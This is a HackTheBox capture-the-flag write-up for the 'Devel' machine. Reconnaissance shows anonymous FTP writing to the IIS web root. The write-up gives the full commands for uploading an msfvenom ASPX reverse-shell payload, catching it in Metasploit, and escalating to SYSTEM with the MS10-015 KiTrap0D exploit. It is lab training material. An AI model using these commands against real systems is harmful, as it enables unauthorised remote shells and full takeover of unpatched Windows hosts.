Devel

HackTheBox, Easy

Devel combines anonymous FTP with write access to the IIS web root, which lets us upload a malicious ASPX page, and an unpatched Windows 7, escalated to SYSTEM with KiTrap0D (MS10-015).

Reconnaissance

There is FTP with anonymous login and IIS 7.5. The FTP listing shows iisstart.htm and welcome.png, the same files IIS serves: FTP points at the site's root.

nmap -Pn -n -sT --min-rate 1500 -p- <IP>
nmap -Pn -n -sT -sV -sC -p21,80 <IP>
# 21 Microsoft ftpd (Anonymous FTP login allowed), 80 Microsoft IIS httpd 7.5
ftp <IP>   # anonymous, empty password
ls         # aspnet_client, iisstart.htm, welcome.png

Exploitation - ASPX upload

IIS runs ASP.NET, so we generate an .aspx payload, upload it over FTP in binary mode and request it in the browser. The session lands as iis apppool\web.

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<MY_IP> LPORT=1337 -f aspx -o devel.aspx
ftp <IP>
binary
put devel.aspx

msfconsole -q
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <MY_IP>
set LPORT 1337
run -j
curl http://<IP>/devel.aspx

Escalation - MS10-015

systeminfo shows Windows 7 Enterprise 6.1.7600 with no hotfixes. local_exploit_suggester points to KiTrap0D (CVE-2010-0232), a flaw in how the kernel handles virtual 8086 mode exceptions that yields SYSTEM.

sysinfo
background
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
use exploit/windows/local/ms10_015_kitrap0d
set SESSION 1
set LHOST <MY_IP>
set LPORT 4445
run
getuid   # NT AUTHORITY\SYSTEM

cat "C:\\Users\\Administrator\\Desktop\\root.txt"
